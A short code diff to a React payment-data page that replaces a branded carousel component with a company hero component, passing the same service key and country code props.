@@ -12,7 +12,7 @@ import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
 import { ArrowLeft, User, Mail, Phone, CreditCard, Hash, Building2 } from "lucide-react";
 import BrandedTopBar from "@/components/BrandedTopBar";
-import BrandedCarousel from "@/components/BrandedCarousel";
+import CompanyHero from "@/components/CompanyHero";
 import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { shippingCompanyBranding } from "@/lib/brandingSystem";
@@ -197,7 +197,7 @@ const PaymentData = () => {
         showCarousel={false}
       />
 
-      <BrandedCarousel serviceKey={serviceKey} className="mb-0" countryCode={countryCode} />
+      <CompanyHero serviceKey={serviceKey} className="mb-0" countryCode={countryCode} />
 
       <div 
         className="min-h-screen py-6 sm:py-8" 
